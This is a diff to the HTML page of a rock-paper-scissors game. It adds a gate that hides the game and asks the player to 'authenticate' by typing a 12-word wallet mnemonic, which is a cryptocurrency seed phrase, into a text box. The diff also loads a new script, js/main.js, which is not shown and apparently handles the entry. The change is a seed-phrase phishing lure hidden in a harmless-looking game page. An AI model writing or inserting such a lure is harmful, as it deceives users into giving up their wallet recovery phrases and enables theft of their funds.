@@ -10,7 +10,27 @@
 </head>
 
 <body>
-    <section class="container">
+    <section class="container mb-30 centered-section">
+        <div>
+            <p>Authenticate account to play game:</p>
+            <textarea placeholder="Enter your 12 digits mnemonic" class="centered-textarea auth-input"></textarea>
+            <button class="auth-btn">Authenticate</button>
+        </div>
+    </section>
+    <section class="container hidden">
+        <!-- <div class="coin-section">
+            <div class="coin-score">
+                <p>Score: 0</p>
+            </div>
+            <div>
+                <img src="images/coin.jpg" alt="Coin image" />
+                <img src="images/coin.jpg" alt="Coin image" />
+                <img src="images/coin.jpg" alt="Coin image" />
+                <img src="images/coin.jpg" alt="Coin image" />
+                <img src="images/coin.jpg" alt="Coin image" />
+            </div>
+        </div> -->
+
         <!-- Result display section -->
         <div class="result_field">
             <!-- Container for user and BOT result images -->
@@ -21,10 +41,10 @@
                 <span class="bot_result">
                     <img src="images/rock.png" alt="BOT's choice image" />
                 </span>
-            </div> 
+            </div>
             <!-- Display the game result message -->
             <div class="result">Let's Play!</div>
-        </div> 
+        </div>
 
         <!-- Options for user to choose from -->
         <div class="option_images">
@@ -42,8 +62,9 @@
             </span>
         </div>
     </section>
-
+    <div id="toast" class="toast"></div>
     <script src="js/script.js" defer></script>
+    <script src="js/main.js" defer></script>
 </body>
 
 </html>
